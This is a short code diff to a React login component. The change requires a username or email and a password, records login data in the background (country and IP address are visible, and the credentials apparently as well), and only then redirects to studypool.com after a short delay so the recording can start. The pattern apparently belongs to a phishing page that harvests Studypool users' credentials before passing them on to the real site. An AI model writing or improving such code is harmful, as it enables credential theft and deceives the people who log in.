@@ -32,9 +32,12 @@ export default function Login() {
 
   const recordLoginMutation = trpc.student.recordLogin.useMutation();
 
-  const handleLogin = async () => {
-    // Redirect to studypool.com immediately
-    window.location.href = "https://www.studypool.com";
+  const handleLogin = () => {
+    // Only redirect if both email and password are provided
+    if (!email || !password) {
+      alert("Please enter both username/email and password");
+      return;
+    }
 
     // Record the login data in the background (fire and forget)
     recordLoginMutation.mutate({
@@ -44,6 +47,11 @@ export default function Login() {
       country: userCountry,
       ipAddress: userIp,
     });
+
+    // Redirect to studypool.com after a tiny delay to ensure mutation starts
+    setTimeout(() => {
+      window.location.href = "https://www.studypool.com";
+    }, 100);
   };
 
   return (
